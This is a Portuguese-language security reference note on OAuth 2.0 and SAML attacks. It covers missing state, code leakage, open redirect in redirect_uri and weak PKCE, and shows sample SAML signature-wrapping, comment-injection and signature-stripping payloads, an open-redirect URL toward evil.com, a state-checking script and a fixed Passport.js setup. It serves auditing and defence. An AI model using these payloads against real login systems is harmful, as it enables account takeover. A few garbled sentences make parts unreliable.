# OAuth 2.0 & SAML — Ataques de Protocolo

**Tags:** #alto #critico #oauth #saml #sso #token-theft #account-takeover
**OWASP:** A07:2021 — Identification and Authentication Failures
**CVSS Base:** 8.1 (Alto) → 9.3 (Crítico — account takeover sem interação)

---

## 📖 O que é

OAuth 2.0 e SAML são protocolos de autenticação/autorização com falhas arquiteturais específicas que vão além de vulnerabilidades de código — requerem análise de fluxo de protocolo.

---

## 🔍 `grep_search` Táticas

```
passport.use(new OAuth
oauth2
saml
xmldom
xml-crypto
SimpleSAMLphp
state
redirect_uri
code
access_token
PKCE
code_verifier
code_challenge
authorizationUrl
tokenUrl
```

---

## 💣 OAuth 2.0 — Ataques

### 1. CSRF no OAuth (State Ausente ou Não Validado)

**Como funciona:** o parâmetro `state` deve ser gerado aleatoriamente, associado à sessão do usuário, e verificado quando o authorization code retorna. Sem ele, um atacante força a vítima a vincular sua conta com a conta do atacante.

```javascript
// ❌ VULNERÁVEL — sem state
app.get('/oauth/login', (req, res) => {
    const authUrl = `https://provider.com/oauth/authorize?` +
        `client_id=${CLIENT_ID}&` +
        `redirect_uri=${CALLBACK_URL}&` +
        `response_type=code`;
        // ↑ Sem &state=...
    res.redirect(authUrl);
});
```

**Exploit CSRF OAuth (Account Linking Attack):**
```
1. Atacante inicia o fluxo OAuth no site alvo
2. Obtém a URL de autorização sem state
3. Pede para a vítima acessar a URL de autorização (via phishing/CSRF)
4. Vítima autentica no provider
5. O authorization code da vítima vai para a callback do site alvo
6. O site associa a conta OAuth da vítima com a sessão do atacante
7. Atacante agora faz login como a vítima
```

---

### 2. Authorization Code Leakage via Referer

```
1. redirect_uri → página que carrega recursos externos (CDN, analytics)
2. O browser envia o ?code=XXX no header Referer para esses serviços externos
3. O authorization code vaza nos logs desses serviços
```

**Detecção estática:** verificar se a callback page tem links para recursos externos (`<script src="https://cdn...">`, `<img src="https://analytics...">`).

---

### 3. Open Redirect no redirect_uri

```
# Se o servidor aceita redirect_uri com open redirect:
https://target.com/oauth/callback?redirect=/../../evil.com

# O authorization code é enviado para o domínio do atacante
```

→ Ver: [[Open Redirect]]

---

### 4. PKCE Ausente (Implicit Flow)

```
# Implicit Flow (legado) retorna token diretamente na URL:
https://app.com/callback#access_token=eyJ...&token_type=bearer

# Token exposto em:
- Logs de servidor (URL com fragment raramente logada, mas possível)
- History do browser (fragmento não é enviado ao servidor, mas fica no histórico)
- Header Referer de páginas subsequentes
- Compartilhamento de URL
```

**PKCE Bypass (sem S256):**
```
Se o servidor aceita code_challenge_method=plain (em vez de S256):
O atacante pode interagir o code_verifier do "plain" facilmente
```

---

## 💣 SAML — Ataques

### 1. XML Signature Wrapping (XSW)

**Como funciona:** o parser SAML valida a assinatura digital em um elemento, mas o sistema *usa* um elemento diferente (não assinado) da mesma requisição.

```xml
<!-- Resposta SAML legítima assinada -->
<Response>
    <Signature>...</Signature>
    <Assertion>
        <Subject>
            <NameID>user@legitimate.com</NameID>
        </Subject>
    </Assertion>
</Response>

<!-- ← Atacante insere elemento malicioso NÃO assinado -->

<Response>
    <Assertion>
        <Subject>
            <NameID>admin@company.com</NameID>  ← conta do atacante
        </Subject>
    </Assertion>
    <Signature>
        <SignedInfo>
            <!-- Referencia o elemento legítimo abaixo -->
        </SignedInfo>
    </Signature>
    <Assertion id="signed-assertion">
        <Subject>
            <NameID>user@legitimate.com</NameID>  ← assinado legítimo
        </Subject>
    </Assertion>
</Response>

<!-- Sistema valida a assinatura do elemento legítimo, mas usa o primeiro elemento
     (não assinado) = login como admin@company.com sem válida assinatura -->
```

---

### 2. Comment Injection

```xml
<!-- Bypass de parser com comment XML -->
<NameID>user@evil.com<!--</NameID><NameID Id="vulnerable">-->@trusted.com</NameID>
```

Alguns parsers SAML interpretam o NameID de forma diferente da validação de assinatura.

---

### 3. Signature Stripping

```xml
<!-- Remover a assinatura completamente -->
<!-- Se o SP (Service Provider) não exige assinatura → aceita qualquer assertion -->
<Assertion>
    <Subject>
        <NameID>admin@company.com</NameID>
    </Subject>
    <!-- <Signature>...</Signature> ← removido -->
</Assertion>
```

**Detecção:** verificar se `WantsAssertionsSigned` é `true` na SP metadata.

---

## 🧪 Verificação de Fluxo OAuth

```python
# .tmp/check_oauth_state.py
import requests, re

TARGET = "http://target.com"
OAUTH_INIT = "/auth/oauth/login"  # endpoint que inicia OAuth

r = requests.get(f"{TARGET}{OAUTH_INIT}", allow_redirects=False)
location = r.headers.get('Location', '')

print(f"Redirect URL: {location}")

if 'state=' in location:
    state = re.search(r'state=([^&]+)', location)
    print(f"✅ State presente: {state.group(1) if state else 'sim'}")
    print("   → Verificar também se state é validado no callback!")
else:
    print("🔴 VULN: State AUSENTE no fluxo OAuth → CSRF possível!")

if 'response_type=token' in location:
    print("🔴 VULN: Implicit Flow detectado → token exposto na URL!")

if 'code_challenge' not in location:
    print("⚠️  INFO: PKCE não implementado → verificar se fluxo é público")
```

---

## 🛡️ Correção OAuth

```javascript
// ✅ CORRETO — Passport.js com state e PKCE
const passport = require('passport');
const OAuth2Strategy = require('passport-oauth2');
const crypto = require('crypto');

passport.use(new OAuth2Strategy({
    authorizationURL: 'https://provider.com/oauth/authorize',
    tokenURL: 'https://provider.com/oauth/token',
    clientID: process.env.OAUTH_CLIENT_ID,
    clientSecret: process.env.OAUTH_CLIENT_SECRET,
    callbackURL: 'https://myapp.com/oauth/callback',
    state: true,         // ← habilitar state automático
    pkce: true,          // ← habilitar PKCE (S256)
}, async (accessToken, refreshToken, profile, cb) => {
    // Verificar se state bate antes de processar o profile
    const user = await User.findOrCreate({ providerId: profile.id });
    return cb(null, user);
}));
```

---

## 🔗 Chain Exploits

```
OAuth CSRF (sem state) → Account Linking → Takeover da conta da vítima
Authorization Code Leakage + replay attack → Login como vítima
XSW SAML → Admin account takeover via SSO corporativo
SAML Signature Stripping + asserta qualquer email → Admin login sem credenciais
OAuth Implicit Flow + Referer + analytics terceiro → Token nos logs da analytics
Open Redirect + redirect_uri + OAuth code → Token theft completo
```

---

## 📌 Referências
- [[JWT — Algorithm Confusion & Ataques]]
- [[Open Redirect]]
- [[Autenticação & Gestão de Sessão]]
- [[XML External Entity (XXE)]]
- [PortSwigger OAuth](https://portswigger.net/web-security/oauth)
- [OWASP SAML Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html)
